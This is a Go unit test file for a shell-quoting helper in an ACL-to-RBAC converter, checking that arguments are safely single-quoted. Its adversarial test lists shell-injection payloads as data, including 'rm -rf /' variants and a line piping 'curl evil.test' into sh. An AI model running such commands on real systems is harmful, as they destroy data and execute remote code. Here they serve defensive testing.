// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 Monedula contributors

package shell_test

import (
	"strings"
	"testing"

	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/emit/shell"
)

func TestQuote(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"alice", "'alice'"},
		{"User:alice", "'User:alice'"},
		{"o'malley", `'o'\''malley'`},
		{"with spaces", "'with spaces'"},
		{"$VAR", "'$VAR'"},
		{`back\slash`, `'back\slash'`},
	}
	for _, c := range cases {
		got := shell.Quote(c.in)
		if got != c.want {
			t.Errorf("Quote(%q): got %q, want %q", c.in, got, c.want)
		}
	}
}

// TestQuote_EmptyString pins the empty-string special case: an empty
// single-quoted string is the only valid POSIX way to pass an empty argument
// ("" inside single quotes would be the two-char string "").
func TestQuote_EmptyString(t *testing.T) {
	if got := shell.Quote(""); got != "''" {
		t.Errorf("Quote(\"\") = %q, want \"''\"", got)
	}
}

// TestQuote_Adversarial throws shell-injection payloads at Quote and asserts
// the single-quote-wrapping invariant holds: this is the injection class the
// mds-curl escaping bug fell into. Because we can't portably spawn a shell,
// we assert the structural invariant that GUARANTEES safety in POSIX sh/bash:
//
//	output == "'" + s.replace("'", "'\\''") + "'"
//
// i.e. the payload is enclosed in single quotes (which suppress ALL
// interpolation), every embedded single quote is broken out via the canonical
// close-and-reopen idiom shown above, and no shell metacharacter ever appears
// OUTSIDE a single-quoted region. We verify that reconstructing the original
// from the quoted form (stripping the quoting) yields exactly the input.
func TestQuote_Adversarial(t *testing.T) {
	payloads := []string{
		`$VAR`,
		`${HOME}`,
		"`whoami`",
		`$(rm -rf /)`,
		`"; rm -rf / #`,
		`' ; echo pwned ; '`,
		`a' && curl evil.test | sh ; '`,
		`back\slash`,
		`new
line`,
		`tab	sep`,
		`--flag-looking`,
		`-rf`,
		`a&&b`,
		`a||b`,
		`a|b`,
		`a;b`,
		`a>b<c`,
		`a*b?c[d]`,
		`~root`,
		`%n%n%n`,
		`User:alice`,
		`o'malley`,
		`''''`,
		`mixed '$x' "and" ` + "`y`",
	}

	for _, in := range payloads {
		t.Run(sanitizeName(in), func(t *testing.T) {
			out := shell.Quote(in)

			// Invariant 1: result is wrapped in single quotes.
			if len(out) < 2 || out[0] != '\'' || out[len(out)-1] != '\'' {
				t.Fatalf("Quote(%q) = %q: not single-quote wrapped", in, out)
			}

			// Invariant 2: the only way a single quote leaves the quoted
			// context is the canonical '\'' idiom. Equivalently, the exact
			// construction must reproduce the output.
			want := "'" + strings.ReplaceAll(in, "'", `'\''`) + "'"
			if out != want {
				t.Fatalf("Quote(%q) = %q, want %q (single-quote idiom violated)", in, out, want)
			}

			// Invariant 3: round-trip. A POSIX shell unwraps single-quoted
			// regions by dropping the quotes and treating everything else
			// literally; the '\'' idiom inserts a literal single quote.
			// Reconstructing that yields the original byte-for-byte. If it
			// doesn't, a metacharacter escaped the quoting.
			if got := shellUnquote(out); got != in {
				t.Errorf("round-trip mismatch: Quote(%q) -> %q -> unquoted %q", in, out, got)
			}
		})
	}
}

// shellUnquote reverses shell.Quote's single-quote scheme: it walks the
// quoted string the way a POSIX shell tokenizer would, concatenating the
// contents of single-quoted regions and the literal single quotes produced by
// the close-and-reopen idiom. It panics on any structure shell.Quote should
// never emit, which is itself an assertion that the output is well-formed.
func shellUnquote(q string) string {
	var b strings.Builder
	i := 0
	for i < len(q) {
		if q[i] != '\'' {
			// shell.Quote only emits a bare backslash as part of the '\''
			// idiom; outside an opening quote there should be nothing but
			// the start of a single-quoted region.
			panic("unexpected char outside single quotes: " + q[i:])
		}
		i++ // consume opening '
		for i < len(q) && q[i] != '\'' {
			b.WriteByte(q[i])
			i++
		}
		if i >= len(q) {
			panic("unterminated single quote: " + q)
		}
		i++ // consume closing '
		// A `\'` immediately following a closed region is the escaped literal
		// single quote of the '\'' idiom: \ then ' then the next ' reopens.
		if i+1 < len(q) && q[i] == '\\' && q[i+1] == '\'' {
			b.WriteByte('\'')
			i += 2 // consume \ and '
		}
	}
	return b.String()
}

// sanitizeName makes a payload safe to use as a subtest name.
func sanitizeName(s string) string {
	r := strings.NewReplacer("\n", "\\n", "\t", "\\t", " ", "_", "/", "_")
	out := r.Replace(s)
	if len(out) > 40 {
		out = out[:40]
	}
	if out == "" {
		out = "empty"
	}
	return out
}
